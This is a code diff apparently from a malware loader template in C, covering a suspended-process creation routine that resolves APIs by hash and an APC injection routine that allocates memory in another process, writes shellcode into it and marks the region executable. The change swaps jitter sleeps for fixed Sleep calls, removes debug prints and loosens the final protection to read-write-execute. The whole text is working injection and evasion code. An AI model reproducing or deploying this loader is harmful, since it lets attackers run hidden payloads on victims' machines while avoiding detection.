@@ -33,7 +33,7 @@ BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hP
 	// API Hashing
 	cCPA cCPAu = (cCPA) GetProcAddressH(GetModuleHandleH(#-KERNEL32_VALUE-#), #-CREATEPROCESSA_VALUE-#);
 
-	JITTER_SLEEP(15000);
+	Sleep(15000);
 	if(!cCPAu(
 		NULL,
 		lpPath,
@@ -55,7 +55,7 @@ BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hP
 	*hProcess		= Pi.hProcess;
 	*hThread		= Pi.hThread;
 
-	JITTER_SLEEP(5000);
+	Sleep(5000);
 	return TRUE;
 }
 
@@ -68,7 +68,6 @@ BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShel
 
 	if ((STATUS = NTAVM(hProcess, ppAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
 
-		//printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
 
@@ -76,21 +75,15 @@ BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShel
 
 	if ((STATUS = NTWVM(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sSizeOfShellcode) {
 
-		//printf("[!] NtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
 
-	//printf("[+] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
 
+	Sleep(2500);
+	if ((STATUS = NTPVM(hProcess, ppAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
 
-	JITTER_SLEEP(2500);
-	if ((STATUS = NTPVM(hProcess, ppAddress, &sSizeOfShellcode, PAGE_EXECUTE_READ, &uOldProtection)) != 0) {
-
-		//printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
-
-	//printf("[+] Successfully changed memory region permission to RWX!\n");
 
 	return TRUE;
 
